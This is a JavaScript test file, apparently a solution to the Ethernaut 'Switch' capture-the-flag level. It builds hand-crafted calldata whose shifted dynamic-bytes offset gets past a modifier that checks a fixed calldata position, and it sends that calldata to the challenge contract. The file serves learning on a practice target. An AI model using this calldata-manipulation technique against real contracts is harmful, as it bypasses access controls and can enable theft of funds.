const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, attacker, challenge, tx

before(async () => {
    ;[s1] = await ethers.getSigners()

    //TODO don't specify blockNumber in hardhat.config.js => //blockNumber: 2500000,
    // https://sepolia.etherscan.io/tx/0xc7fce9f44e76c0cd7beb54f00426bd98ae6513d2ab6c85d30ce2bb1d7012ffd5
    const challengeAddress = await createChallenge("0xb2aBa0e156C905a9FAEc24805a009d99193E3E53")
    challenge = await ethers.getContractAt("Switch", challengeAddress)
})

it("solves the challenge", async function () {
    try {
        //the only way to flip the switch is by calling flipSwitch => we just have to figure out what data to provide
        //and how to pass onlyOff()
        //onlyOff() takes 4 bytes starting at position 68 from calldata (_data in our case) and compares them with thhe offselector
        //if they are the same, we pass the modifier

        //let's get the offselector (turnSwitchOff) as well as turnSwitchOn & flipSwitch => we may need them later :
        let iface = new ethers.utils.Interface([
            "function turnSwitchOn()",
            "function turnSwitchOff()",
            "function flipSwitch(bytes)",
        ])

        let onSigHash = iface.getSighash("turnSwitchOn")
        let offSigHash = iface.getSighash("turnSwitchOff")
        let flipSwitchSigHash = iface.getSighash("turnSwitchOn")
        console.log("On sig hash: ", onSigHash)
        console.log("Off sig hash: ", offSigHash)
        console.log("Flip sig hash: ", flipSwitchSigHash)

        //now, we try to call flipSwitch and we pass the data from the offSigHash => we are calling turnSwitchOff()
        console.log("Encoded Flip", iface.encodeFunctionData("flipSwitch", [onSigHash]))

        //we get this:
        //0x30c13ade    => function sig hash
        //0000000000000000000000000000000000000000000000000000000000000020  => offset hex(20) = 32 bytes
        //0000000000000000000000000000000000000000000000000000000000000004  => length of data = 4 bytes
        //76227e1200000000000000000000000000000000000000000000000000000000  => data

        // we need to create the data that contains the offSigHash at position 68,
        // but that actually calls turnSwitchOn =>
        // at the biginning we need the flipSwitchSigHash => then we define an offset of 3 words (3 * 32 bytes = hex60) =>
        // then, we add an empty line => that way our offSigHash (20606e15) can be positioned at 68 (bytes = 136 char) =>
        // then, we need to qpecify the length of our data - which is of course 4 bytes for the onSigHash =>
        // and, finally, we specify the sigHash of the function to call => turnSwitchOn == 76227e12 :

        // 0x30c13ade
        // 0000000000000000000000000000000000000000000000000000000000000060
        // 0000000000000000000000000000000000000000000000000000000000000000
        // 20606e1500000000000000000000000000000000000000000000000000000000
        // 0000000000000000000000000000000000000000000000000000000000000004
        // 76227e1200000000000000000000000000000000000000000000000000000000

        const data =
            "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"

        // now, we perform the call
        tx = await s1.sendTransaction({
            from: s1.address,
            to: challenge.address,
            data,
        })
        await tx.wait()

        console.log("Switch on: ", await challenge.switchOn())
    } catch (err) {
        console.log(err)
    }
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
